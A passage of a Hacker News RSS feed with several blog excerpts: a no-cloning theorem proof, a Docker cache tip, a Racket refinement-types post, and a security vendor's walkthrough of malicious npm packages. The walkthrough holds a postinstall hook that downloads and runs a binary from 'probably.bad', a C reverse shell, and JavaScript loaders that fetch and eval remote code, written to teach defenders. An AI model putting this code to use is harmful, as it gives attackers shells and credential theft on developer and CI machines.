Protocol) servers act as …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tailscale.com/blog/how-nat-traversal-works/">https://tailscale.com/blog/how-nat-traversal-works/</a></em></p>]]>
            </description>
            <link>https://tailscale.com/blog/how-nat-traversal-works/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241105</guid>
            <pubDate>Sat, 22 Aug 2020 02:36:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No-Cloning Theorem]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24241066">thread link</a>) | @keyboardman
<br/>
August 21, 2020 | https://leimao.github.io/blog/No-Cloning-Theorem/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/No-Cloning-Theorem/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>In the classical world, it is quite common that we could make an exactly the same copy of something. However, in the quantum world, the laws of physics impose a severe restriction on copying: It is impossible to make a perfect copy of an unknown state.</p>



<p>In this blog post, I would like to discuss the No-Cloning Theorem in quantum theory.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="kronecker-product-inverse-transpose-property">Kronecker Product Inverse-Transpose Property</h4>

<p>Conjugate transposition are distributive over the Kronecker product:</p><p>

\[(A \otimes B)^{\dagger} =  A^{\dagger} \otimes B^{\dagger}\]

\[\begin{align}
(A \otimes B)^{\dagger} &amp;= 
\begin{bmatrix} 
    A_{0,0}B &amp; A_{0,1}B &amp; \cdots &amp; A_{0,n-1}B \\
    A_{1,0}B &amp; A_{1,1}B &amp; \cdots &amp; A_{1,n-1}B \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    A_{m-1,0}B &amp; A_{m-1,1}B &amp; \cdots &amp; A_{m-1,n-1}B \\
\end{bmatrix}^{\dagger} 
\nonumber\\
&amp;= 
\begin{bmatrix} 
    (A_{0,0}B)^{\dagger} &amp; (A_{1,0}B)^{\dagger} &amp; \cdots &amp; (A_{m-1,0}B)^{\dagger} \\
    (A_{0,1}B)^{\dagger} &amp; (A_{1,1}B)^{\dagger} &amp; \cdots &amp; (A_{m-1,1}B)^{\dagger} \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    (A_{0,n-1}B)^{\dagger} &amp; (A_{1,n-1}B)^{\dagger} &amp; \cdots &amp; (A_{m-1,n-1}B)^{\dagger} \\
\end{bmatrix}
\nonumber\\
&amp;= 
\begin{bmatrix} 
    \overline{A_{0,0}}B^{\dagger} &amp; \overline{A_{1,0}}B^{\dagger} &amp; \cdots &amp; \overline{A_{m-1,0}}B^{\dagger} \\
    \overline{A_{0,1}}B^{\dagger} &amp; \overline{A_{1,1}}B^{\dagger} &amp; \cdots &amp; \overline{A_{m-1,1}}B^{\dagger} \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    \overline{A_{0,n-1}}B^{\dagger} &amp; \overline{A_{1,n-1}}B^{\dagger} &amp; \cdots &amp; \overline{A_{m-1,n-1}}B^{\dagger} \\
\end{bmatrix}
\nonumber\\
&amp;= 
\begin{bmatrix} 
    A_{0,0}^{\dagger}B^{\dagger} &amp; A_{0,1}^{\dagger}B^{\dagger} &amp; \cdots &amp; A_{0, m-1}^{\dagger}B^{\dagger} \\
    A_{1,0}^{\dagger}B^{\dagger} &amp; A_{1,1}^{\dagger}B^{\dagger} &amp; \cdots &amp; A_{1, m-1}^{\dagger}B^{\dagger} \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    A_{n-1,0}^{\dagger}B^{\dagger} &amp; A_{n-1,1}^{\dagger}B^{\dagger} &amp; \cdots &amp; A_{n-1,m-1}^{\dagger}B^{\dagger} \\
\end{bmatrix}
\nonumber\\
&amp;=
A^{\dagger} \otimes B^{\dagger} \\
\end{align}\]

</p><p>This concludes the proof.</p>

<h4 id="kronecker-product-mixed-product-property">Kronecker Product Mixed-Product Property</h4>

<p>Let $A \in \mathbb{C}^{m \times n}$, $B \in \mathbb{C}^{r \times s}$, $C \in \mathbb{C}^{n \times p}$, and $D \in \mathbb{C}^{s \times t}$, then</p><p>

\[(A \otimes B)(C \otimes D) = (AC) \otimes (BD)\]

</p><p>This has been proved in <a href="https://leimao.github.io/blog/Kronecker-Product-In-Circuits/">Kronecker Product In Circuits</a>.</p>

<h4 id="inner-product-expansion-property">Inner Product Expansion Property</h4>

<p>Suppose $|x\rangle$ is any unit vector whose $|x|^2 = \langle x | x \rangle = 1$. We have $\langle \phi | \psi \rangle = (\langle \phi | \otimes \langle x |) (| x \rangle \otimes | \psi \rangle)$</p><p>

\[\begin{align}
(\langle \phi | \otimes \langle x |) (| \psi \rangle \otimes | x \rangle) &amp;= (| \psi \rangle \otimes | x \rangle)^{\dagger} (|\phi\rangle \otimes |x\rangle) \\
&amp;= (| \psi \rangle^{\dagger} \otimes | x \rangle^{\dagger}) (|\phi\rangle \otimes |x\rangle) \\
&amp;= (| \psi \rangle^{\dagger}|\phi\rangle) \otimes (| x \rangle^{\dagger}|x\rangle) \\
&amp;= \langle \phi | \psi \rangle \otimes \langle x | x \rangle\\
&amp;= \langle \phi | \psi \rangle \otimes 1\\
&amp;= \langle \phi | \psi \rangle\\
\end{align}\]

</p><p>This concludes the proof.</p>

<h4 id="unitary-matrix-preserves-inner-product">Unitary Matrix Preserves Inner Product</h4>

<p>Given two complex vectors $x$ and $y$, multiplication by unitary matrix $U$ preserves their inner product.</p><p>

\[\begin{align}
\langle Ux, Uy \rangle &amp;= \langle x, y \rangle
\end{align}\]

</p><p>Using the definition of inner product,</p><p>

\[\begin{align}
\langle Ux, Uy \rangle &amp;= (Uy)^{\dagger} (Ux) \\
&amp;= y^{\dagger}U^{\dagger} U x \\
&amp;= y^{\dagger}(U^{\dagger} U) x \\
&amp;= y^{\dagger} I x \\
&amp;= y^{\dagger} x \\
&amp;= \langle x, y \rangle \\
\end{align}\]

</p><p>This concludes the proof.</p>

<h3 id="no-cloning-theorem">No-Cloning Theorem</h3>

<p>In quantum mechanics, copy, as it is the same to other quantum operators except measurement operators, is an reversible and linear operator.</p>



<p>Given any unknown normalized quantum state $| \phi \rangle$, and the copy operator $U$, we are supposed to have the following mathematical expression if we are going to copy the quantum state $| \phi \rangle$ to another system whose quantum state is $|x \rangle$ before copy.</p><p>

\[| \phi \rangle \otimes |x\rangle \xrightarrow[]{U} | \phi \rangle \otimes |\phi\rangle\]

</p><p>We would like to write this transformation into equation.</p><p>

\[U (| \phi \rangle \otimes |x\rangle) = | \phi \rangle \otimes |\phi\rangle\]

</p><p>Without loss of generality, we could have another state $| \psi \rangle$ that is applied to the copy operator.</p><p>

\[U (| \psi \rangle \otimes |x\rangle) = | \psi \rangle \otimes |\psi\rangle\]

</p><p>Note that for $| \psi \rangle$ we also used $|x\rangle$ which $| \phi \rangle$ is using, meaning that before copy, the “vacant” system is always the same. This is something we could guarantee.</p>



<p>We examine the inner product of $| \phi \rangle$ and $| \psi \rangle$ using the copy property and all the properties in the prerequisite section.</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= (\langle \phi | \otimes \langle x |) (| \psi \rangle \otimes | x \rangle) \\
&amp;= \big(U (\langle \phi | \otimes \langle x |)\big) \big(U (| \psi \rangle \otimes | x \rangle)\big) \\
&amp;= (\langle \phi | \otimes \langle \phi |) (| \psi \rangle \otimes | \psi \rangle) \\
&amp;= (| \psi \rangle \otimes | \psi \rangle)^{\dagger} (| \phi \rangle \otimes | \phi \rangle) \\
&amp;= (| \psi \rangle^{\dagger} \otimes | \psi \rangle^{\dagger}) (| \phi \rangle \otimes | \phi \rangle) \\
&amp;= (| \psi \rangle^{\dagger} | \phi \rangle ) \otimes (| \psi \rangle^{\dagger} | \phi \rangle ) \\
&amp;= \langle \phi | \psi \rangle \otimes \langle \phi | \psi \rangle \\
\end{align}\]

</p><p>Because $\langle \phi | \psi \rangle$ is scalar, we further have</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= \langle \phi | \psi \rangle \otimes \langle \phi | \psi \rangle \\
&amp;= \langle \phi | \psi \rangle ^2 \\
\end{align}\]

</p><p>Solving the above equation, we have $\langle \phi | \psi \rangle = 0$ or $1$.</p>



<p>Because $| \phi \rangle$ and $| \psi \rangle$ could be any arbitrary unknown states, $\langle \phi | \psi \rangle = 0$ or $1$ could never be satisfied.</p>



<p>Therefore, there is no general quantum copy operator that makes copy of any unknown state.</p>

<h3 id="more-restrict-no-cloning-theorem">More Restrict No-Cloning Theorem</h3>

<p>In quantum theory, $| \phi \rangle$ and $c | \phi \rangle$, where $c$ is a non-zero complex number, represent the same physical state. If $|c \phi|^2 = 1$, then $| \phi \rangle$ and $c | \phi \rangle$ only have phase difference.</p>



<p>For example, $| \phi \rangle$ and $| \psi \rangle$ have exactly the same probability of collapsing to $| 0 \rangle$ and $| 1 \rangle$. However, $| \phi \rangle$ has phase $\varphi_1$ while $| \psi \rangle$ has phase $\varphi_2$.</p><p>

\[\begin{align}
| \phi \rangle &amp;= \cos \frac{\theta}{2} | 0 \rangle + e^{i\varphi_1} \sin \frac{\theta}{2} | 1 \rangle \\
| \psi \rangle &amp;= \cos \frac{\theta}{2} | 0 \rangle + e^{i\varphi_2} \sin \frac{\theta}{2} | 1 \rangle \\
\end{align}\]

</p><p>More restrict No-Cloning Theorem states that “copying” any unknown state while abandoning the phase is not possible either.</p>



<p>Suppose we have such “copy” operator, the mathematical expression for “copy” will be as follows.</p><p>

\[U (| \phi \rangle \otimes |x\rangle) = e^{\varphi} | \phi \rangle \otimes |\phi\rangle\\
U (| \psi \rangle \otimes |x\rangle) = e^{\varphi^{\prime}} | \psi \rangle \otimes |\psi\rangle\]

</p><p>Similarly, we have</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= e^{\varphi} e^{\varphi^{\prime}}\langle \phi | \psi \rangle ^2 \\
&amp;= e^{\varphi + \varphi^{\prime}} \langle \phi | \psi \rangle ^2 \\
\end{align}\]

</p><p>The norm of the two sides should be equivalent.</p><p>

\[\begin{align}
|\langle \phi | \psi \rangle| &amp;= |e^{\varphi + \varphi^{\prime}} \langle \phi | \psi \rangle ^2| \\
&amp;= |e^{\varphi + \varphi^{\prime}}| |\langle \phi | \psi \rangle ^2| \\
&amp;= 1 |\langle \phi | \psi \rangle ^2| \\
&amp;= |\langle \phi | \psi \rangle ^2| \\
&amp;= |\langle \phi | \psi \rangle |^2 \\
\end{align}\]

</p><p>Solving the above equation, we have $|\langle \phi | \psi \rangle | = 0$ or $1$.</p>



<p>Because $| \phi \rangle$ and $| \psi \rangle$ could be any arbitrary unknown states, $|\langle \phi | \psi \rangle | = 0$ or $1$ could never be satisfied.</p>



<p>Therefore, there is no general quantum “copy” operator that makes “copy” of any unknown state that has lost the phase information.</p>

<h3 id="transportation">Transportation</h3>

<p>Since it is not possible to do copy in quantum world, how about transportation?</p>



<p>Concretely, given any unknown normalized quantum state $| \phi \rangle$, and the transportation operator $U$, we are supposed to have the following mathematical expression if we are going to transport the quantum state $| \phi \rangle$ to another system whose quantum state is $|x \rangle$ before transportation.</p><p>

\[U(| \phi \rangle \otimes |x\rangle) = | x \rangle \otimes |\phi\rangle\]

</p><p>Note that although it is called transportation, it is more like a switch, where the two system states, one unknown and one known, got switched.</p>



<p>Without loss of generality, we could have another state $| \psi \rangle$ that is applied to the transportation operator.</p><p>

\[U(| \psi \rangle \otimes |x\rangle) = | x \rangle \otimes |\psi\rangle\]

</p><p>Similarly, we compute the inner product of $| \phi \rangle$ and $| \psi \rangle$.</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= (\langle \phi | \otimes \langle x |) (| \psi \rangle \otimes | x \rangle) \\
&amp;= \big(U (\langle \phi | \otimes \langle x |)\big) \big(U (| \psi \rangle \otimes | x \rangle)\big) \\
&amp;= (\langle x | \otimes \langle \phi |) (| x \rangle \otimes | \psi \rangle) \\
&amp;= (| x \rangle \otimes | \psi \rangle)^{\dagger} (| x \rangle \otimes | \phi \rangle) \\
&amp;= (| x \rangle^{\dagger} \otimes | \psi \rangle^{\dagger}) (| x \rangle \otimes | \phi \rangle) \\
&amp;= (| x \rangle^{\dagger} | x \rangle ) \otimes (| \psi \rangle^{\dagger} | \phi \rangle ) \\
&amp;= \langle x | x \rangle \otimes \langle \phi | \psi \rangle \\
&amp;= 1 \otimes \langle \phi | \psi \rangle \\
&amp;= \langle \phi | \psi \rangle \\
\end{align}\]

</p><p>Unlike copy, we did not find anything …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://leimao.github.io/blog/No-Cloning-Theorem/">https://leimao.github.io/blog/No-Cloning-Theorem/</a></em></p>]]>
            </description>
            <link>https://leimao.github.io/blog/No-Cloning-Theorem/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241066</guid>
            <pubDate>Sat, 22 Aug 2020 02:27:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Anatomy of a Malicious Package]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24241033">thread link</a>) | @todsacerdoti
<br/>
August 21, 2020 | https://blog.phylum.io/malicious-javascript-code-in-npm-malware/ | <a href="https://web.archive.org/web/*/https://blog.phylum.io/malicious-javascript-code-in-npm-malware/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>What does a malicious package actually look like in practice? We'll walk through some hypothetical exercises to see how malware generally works, and what sort of functions we might expect, from relatively simple and temporary, to complex. Additionally, as we are focused primarily on Javascript for this post, we really need to think about two different threat models: what does in-browser malware look like, and how is that going to differ from on-host malware? What are primary attack methods, what could an attacker feasibly accomplish with each level of access, and what has malware historically done in each context? To that end, we will actually split this into a series of articles: in the first (this post), we will begin to examine what "on-host" Javascript malware looks like, followed by a more in-depth look at what we can do to make our malware stealthier and more resistant to removal. Finally, in the last set of posts, we will delve into browser-based malware, and what we can accomplish within the browser sandbox.</p><h3 id="attacker-motivations-and-mentality">Attacker Motivations and Mentality</h3><p>As we begin this thought experiment, the first thing to consider is what a potential attacker's targets and goals would be. We'll focus on NPM specifically in this article, primarily because it gives a good survey of several platforms (in-browser vs on-system) with differing threat models, but the general process, methodologies, and concerns remain the same across other platforms, languages, and ecosystems.</p><h3 id="on-host">On-Host</h3><p>The whole concept of "on-host" malware in NPM packages seems a bit unintuitive at first blush, as the immediate association is generally with browser-focused concerns - which <em>must</em> be safe, since the run in the browser sandbox. In reality, however, on-host<a href="https://arxiv.org/abs/2005.09535"> is actually where most observed Javascript malware runs</a>. There are, interestingly enough, some serious advantages from an attacker's perspective in running there, rather than in an end user's web browser:</p><ul><li>If we run outside of a browser, we have the same level of access as the developer installing our package.</li><li>Running within a large, mainstream package in an end-user's browser increases our odds of being discovered - many more products and users are observing package behavior at the endpoint than during the build process.</li><li>To add to the last point, many security products actually ignore things like <code>devDependencies</code> entirely, and many of the infrastructure pieces, such as CI builders, where build-related code will run on has little-to-nothing in terms of security measures and mitigations.</li></ul><p>While this certainly doesn't mean we are <em>restricted</em> to operating on-host (as we'll see later, there is plenty we can do in-browser), this makes it a very compelling place to begin our journey. As such, we'll walk through an iterative process of making our badware package, and applying some gradual improvements.</p><h3 id="crawl">Crawl</h3><p>To start the project off, we'll build a simple npm package. What exactly it will do, or what value it will provide is largely irrelevant; for argument's sake, it might change the console font color, or include some pictures of cats, &nbsp;but in practice, it simply exists to bundle in our malware.</p><p>In order for our malware to be even moderately successful, we need three elements:</p><ol><li>To gain execution.</li><li>Network access.</li><li>To ensure the user remains unaware that we are running.</li></ol><p>To get what we might consider the most basic form of item one, we'll take a page from some prior work and leverage a great feature of our javascript tooling - the <code>postinstall</code> script. &nbsp;To that end, we'll start with our <code>package.json</code>:</p><pre><code>{
    "name": "mostly-harmless",
    "version": "1.0.0",
    /* ... */
    "scripts": {
        "postinstall": "wget https://probably.bad/malware &amp;&amp; chmod +x malware &amp;&amp; ./malware &amp;"
    }
}</code></pre><p>and (for now, at least) we won't make our malware too complex, perhaps we'll simply start with something like the following:</p><figure><pre><code>#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char** argv)
{
    struct sockaddr_in addr = {0};
	unsigned short     port = 1028;
	const char*        netaddr = "10.0.0.20";
	int                sock = -1;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	if(0 == inet_aton(netaddr, &amp;addr.sin_addr)) {
		return 0;
	}
    
	if(-1 == (sock = socket(AF_INET, SOCK_STREAM, 0))) {
		return 0;
	}

	if(connect(sock, (struct sockaddr*)&amp;addr, sizeof(addr))) {
		goto Cleanup;
	}
    
    if(-1 == dup2(sock, STDOUT_FILENO)) {
		goto Cleanup;
	}

	if(-1 == dup2(sock, STDIN_FILENO)) {
		goto Cleanup;
	}

	if(-1 == dup2(sock, STDERR_FILENO)) {
		goto Cleanup;
	}
	execlp("/bin/bash", "bash", NULL);

Cleanup:
	close(sock);
    
    return 0;
}</code></pre><figcaption>A simple reverse shell</figcaption></figure><p>A small program that will essentially give us a reverse shell - first by opening a socket, connecting to our "remote" server, redirecting stdin/stdout/stderr to our new socket, and then executing bash. From here, we have full console access to the local machine in the same context as the current user (presumably either a developer or a CI runner). </p><p>While this certainly works, and gives us access, it comes with some serious limitations. For one, it's fairly trivial to detect - a simple <code>netstat -an</code> will identify it easily. Another issue is that we have to be ready to accept the connection as soon as the user runs <code>npm install</code>, as it will only try to connect out once, and will die when the current user logs off (barring detached terminals or similar). Finally, it is very overt - not only would most network security devices (IDS or IPS) catch this traffic in-flight, even a casual observer would find this when perusing the <code>package.json</code>. </p><p>Oddly enough, however, the last point (at least, regarding the <code>package.json</code>) is less bad than one might think - while trivial observations would certainly catch it, if our malware is upstream from any non-trivial package installation, manual <a href="https://blog.phylum.io/what-is-the-state-of-npm/">identification might end up being nearly impossible.</a> In fact, as documented in "The Backstabber's Knife Collection" (linked earlier in the article), this sort of scheme <em>has</em> worked for a large subset of discovered javascript malware. Still, we can almost certainly do better.</p><h3 id="walk">Walk </h3><p>Now we have a notional infection vector (via our <code>postinstall</code> script), and some code to give us access to the remote host. Where do we go from here to look at improving our setup? We can draw some inspiration from <a href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes">malware added upstream from <code>eslint</code></a> which harvested (and shipped off) tokens and credentials from the local system, effectively giving attackers the ability to modify previously-published packages controlled by the current user at a future date.</p><p>While we're actually obtaining credentials here, focusing on a single file with a small number of credentials that may (or may not) be on most of the machines we land on seems a bit lackluster when we can look for other locally stored credentials (e.g., AWS tokens, SSH keys, etc) and environment variables.</p><p>In order to get this new functionality up and running, we can start by making a quick change to our previous <code>package.json</code>:</p><pre><code>{
    "name": "mostly-harmless",
    "version": "1.0.1",
    /* ... */
    "scripts": {
        "postinstall": "node ./lib/build.js"
    }
}</code></pre><p>Now instead of running our <em>new</em> malware directly in this file, we'll make it slightly stealthier by remote-hosting the file, and pulling it down at runtime. A quick first pass at this might resemble the following:</p><pre><code>try {
    const https = require("https");
    https.get({
        hostname: "probably.bad",
        path: "/new-malware",
        headers: {
            Accept: "text/html"
        }
    }, 
    res =&gt; { res.on("data" d =&gt; eval(d)); })
        .on("error", () =&gt; {});
       
} catch (e) {}</code></pre><p>Interestingly enough, this is actually <em>almost</em> exactly the same as the malware that launched in the aforementioned <code>eslint</code> attack: it would pull the file retrieval script from a remote host (where we've slotted in our hypothetical attack domain, "probably.bad", the original utilized pastebin), and simply eval the text. While this is mostly effective, there is a critical flaw here - if for some reason we don't get the entire script to execute in the first chunk, our <code>eval</code> will likely fail with syntax error, as we might be attempting to execute half a script (for reference, a copy of the original malware with deeper explanation of the attack and constituent parts can be found <a href="https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e">here</a>), which ended up resulting in the attack being discovered quickly. </p><p>Now certainly the first issue is relatively simple to fix: we need to ensure we've downloaded the <em>full</em> file before we attempt to eval. &nbsp;To that end, what we probably want is something more like the following:</p><pre><code>try {
    const https = require("https");
    https.get("https://probably.bad/new-malware", res =&gt; {
        let tmp = "";
        res.on("data", d =&gt; tmp += d);
        res.on("end", () =&gt; eval(tmp));
    }).on("error", () =&gt; {});
} catch(e) {}</code></pre><p>This should get us more consistent execution at least, but now to think about <em>what</em> we should be harvesting - are NPM creds or crypto wallets really the best we can do? If we think about this a bit, there are two general contexts under which we will run:</p><ol><li>On a developer's system.</li><li>On a CI runner.</li></ol><p>From an attacker's perspective, both places are interesting - albeit for slightly different reasons. In the first case, the answer is somewhat obvious: we are going to be running on a developer's workstation while a project is being built and tested locally. This means that things like credentials (NPM creds, SSH keys, and many more) will likely be available for access and exfiltration, among other things. The second scenario, however, is also interesting - CI runners often get sensitive items such as database credentials, infrastructure keys, and similar injected during the build process. Past experience also shows that some attackers have …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.phylum.io/malicious-javascript-code-in-npm-malware/">https://blog.phylum.io/malicious-javascript-code-in-npm-malware/</a></em></p>]]>
            </description>
            <link>https://blog.phylum.io/malicious-javascript-code-in-npm-malware/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241033</guid>
            <pubDate>Sat, 22 Aug 2020 02:20:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clear Docker Buildx Cache]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24240932">thread link</a>) | @lewuathe
<br/>
August 21, 2020 | https://www.lewuathe.com/clear-docker-buildx-cache.html | <a href="https://web.archive.org/web/*/https://www.lewuathe.com/clear-docker-buildx-cache.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>21 Aug 2020</span></p><p>You might have encountered a situation where you cannot build the latest Docker image when using the <a href="https://docs.docker.com/buildx/working-with-buildx/">Buildx</a>. If so, you may find this article helpful to give you a little insight into your question, <em>“Why I keep seeing the stale image in the list!”</em>.</p>

<p>What I tried was building <a href="https://github.com/Lewuathe/docker-presto-cluster/commit/bcdaf191829754d93876c1e4d44cb33019bd75ad">the Docker image supporting ARM64 architecture</a>. To achieve my goal, it requires me to enable Buildx experimental feature of Docker. It allows us to build a Docker image supporting multiple architectures. When I have found a problem in the image, I wanted to change the Dockerfile to reflect the fix I applied. But it failed. As shown in the following output, the <code>CREATED</code> time of the images keeps the past time even I have created just a few seconds before.</p>

<div><div><pre><code>$ docker images
REPOSITORY                                                    TAG                      IMAGE ID            CREATED             SIZE
presto                                                        341-SNAPSHOT             c15822305160        5 hours ago         1.05GB
lewuathe/presto-worker                                        341-SNAPSHOT             eb1d11521b04        5 hours ago         1.38GB
lewuathe/presto-coordinator                                   341-SNAPSHOT             8e0085374165        5 hours ago         1.38GB
</code></pre></div></div>

<p>That’s was so annoying that I could not test my fix was adequately resolving the issue. Here are two options to overcome this stressful situation.</p>

<h2 id="build-without-any-cache">Build without any cache</h2>

<p>As well as normal build command, <code>buildx</code> also provides <a href="https://thenewstack.io/understanding-the-docker-cache-for-faster-builds/#:~:text=When%20the%20'%E2%80%93no%2Dcache,the%20maximum%20amount%20of%20time."><code>--no-cache</code></a> option. It enables us to build an image from scratch. The latest image will be created for sure.</p>

<div><div><pre><code><span>$ </span>docker buildx build <span>\</span>
    <span>--no-cache</span> <span>\ </span><span># Without using cache</span>
    <span>--platform</span> linux/arm64/v8 <span>\</span>
    <span>-f</span> Dockerfile-arm64v8 <span>\</span>
    <span>-t</span> lewuathe/prestobase:340-SNAPSHOT-arm64v8
</code></pre></div></div>

<h2 id="clearing-the-cache-completely">Clearing the cache completely</h2>

<p>Another option is clearing the cache. However, it has a side-effect affecting other image build time. Since removing all layer caches, it can make the build time for other images longer. But if the images you are holding is not so many, deleting the cache can be a reasonable option.</p>

<p>The builder instance holds the cache. The following command will clear the cache hold by all builders.</p>

<div><div><pre><code><span>$ </span>docker builder prune <span>--all</span>
</code></pre></div></div>

<p>Afterward, you can build the image as usual. We can see the build time is refreshed as follows.</p>

<div><div><pre><code>$ docker images
REPOSITORY                                                    TAG                      IMAGE ID            CREATED             SIZE
presto                                                        341-SNAPSHOT             c15822305160        a second ago        1.05GB
lewuathe/presto-worker                                        341-SNAPSHOT             eb1d11521b04        a second ago        1.38GB
lewuathe/presto-coordinator                                   341-SNAPSHOT             8e0085374165        a second ago        1.38GB
</code></pre></div></div>

<p>To learn the practical techniques of Docker, you may find <a href="https://www.amazon.com/gp/product/1617294802/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=lewuathe-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=1617294802&amp;linkId=9e74c652a72e58e3287c30b704effbde">the following guide from Manning</a> useful. Docker has many options or configurations. If you know these details, Docker will be more attentive tool for you.</p>

<p><a target="_blank" href="https://www.amazon.com/gp/product/1617294802/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1617294802&amp;linkCode=as2&amp;tag=lewuathe-20&amp;linkId=4e8ef0281e7a4fb958f91ce8f10e706c"><img src="https://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;MarketPlace=US&amp;ASIN=1617294802&amp;ServiceVersion=20070822&amp;ID=AsinImage&amp;WS=1&amp;Format=_SL250_&amp;tag=lewuathe-20"></a><img src="https://ir-na.amazon-adsystem.com/e/ir?t=lewuathe-20&amp;l=am2&amp;o=1&amp;a=1617294802" width="1" height="1" alt="">
</p>

<p>Thanks for reading as usual!</p>

<h2 id="references">References</h2>
<ul>
  <li><a href="https://docs.docker.com/buildx/working-with-buildx/">Docker Buildx</a></li>
  <li><a href="https://www.amazon.com/gp/product/1617294802/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=lewuathe-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=1617294802&amp;linkId=9e74c652a72e58e3287c30b704effbde">Docker In Practice</a></li>
</ul>

</div>



    </div></div>]]>
            </description>
            <link>https://www.lewuathe.com/clear-docker-buildx-cache.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24240932</guid>
            <pubDate>Sat, 22 Aug 2020 01:59:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Faking Useful Refinement Types in Racket]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24240926">thread link</a>) | @griffinmb
<br/>
August 21, 2020 | https://gmb.is/refinement-types | <a href="https://web.archive.org/web/*/https://gmb.is/refinement-types">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Refinement types allow you to make expressive type declarations like "any number greater than 3 but less than 33" or "any integer that is prime". Essentially, they are the intersection of a base type and a predicate. Breaking the type descriptions down to their requisite parts, you get something like:</p><p>Base Type: Integer</p><p>Predicate: (3 &lt; x &lt; 33)</p><p>Refinement Type: Integer and (3 &lt; Integer &lt; 33)</p><p>In Typed Racket, this can be translated fairly literally.</p><pre>(: (Refine [n : Integer] (and (&gt; n 3) (&lt; n 33)))
</pre>
<p>In practice, this type would be used like so:</p><pre>(define-type A (Refine [n : Integer] (and [&gt; n 3] [&lt; n 33])))

(: add-one (-&gt; A Integer))
(define (add-one n)
  (+ n 1))
  
&gt; (add-one 4)
- : Integer
5

&gt; (add-one 55)
; main.rkt::2469: Type Checker: type mismatch
;   expected: A
</pre>
<p>Refinement types are cool, and type-theoretically interesting, but they're also really useful. </p><p>For example, I've recently been working on Gemengine, a small Gemini application server. Like HTTP, Gemini has a "Redirect" response. Gemengine supports this response with a simple API:</p><pre>(redirect "/home")
</pre>
<p>If, instead of specifying a "/home" redirect, you allow dynamic, user-controllable input, you've inadvertently introduced a vulnerability: an Open Redirect. Although minor, especially in Gemini-land, we'd rather have no vulnerabilities at all.</p><p>As a library author, it would be great to prevent this issue for Gemengine's users. However, the obvious solution - validating or sanitizing input on the dev's behalf - is not ideal. If we take that approach, we're taking control away from the developer. Even worse, they may not realize we've done so until the application is already in production and they start getting errors.</p><p>A friendlier approach would be to type-enforce secure usage of the `redirect` function. This way, developers aren't surprised, because they must consciously make the secure choice, but they also aren't left vulnerable.</p><p>What would type enforcement look like? Well, essentially what we're looking for is a URL path. Or, put another way, a string that, when parsed as a URL, doesn't have a host component. This type description maps cleanly to our notion of a Refinement type.</p><p>You might expect we could define a type like this:</p><pre>(Refine [n : String] (not [url-host (string-&gt;url n)]))
</pre>
<p>Unfortunately, Racket doesn't support such arbitrary refinement definitionsÂ¹. However, there is a workaround.</p><p>Typed Racket allows you to integrate with untyped Racket, and provides a mechanism to specify types for your untyped code. We can take advantage of this functionality to create types defined by an arbitrary predicate.</p><p>To do so, first we need to define our untyped predicate.</p><pre>; gemini-path.rkt

#lang racket

(require net/url)
(provide gemini-path?)

(define (gemini-path? url)
  (false? (url-host (string-&gt;url url))))
</pre>
<p>Then, we can require it in Typed Racket.</p><pre>; types.rkt

#lang typed/racket

(require/typed "gemini-path.rkt"
  [#:opaque Internal-Gemini-Path gemini-path?])
</pre>
